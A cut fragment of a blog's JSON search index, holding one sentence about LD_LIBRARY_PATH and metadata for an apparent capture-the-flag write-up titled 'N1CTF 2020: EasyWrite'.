0x5.* address LD_LIBRARY_PATH, which is finicky enough that I have not investigated it throughly in the past ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:8:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"}]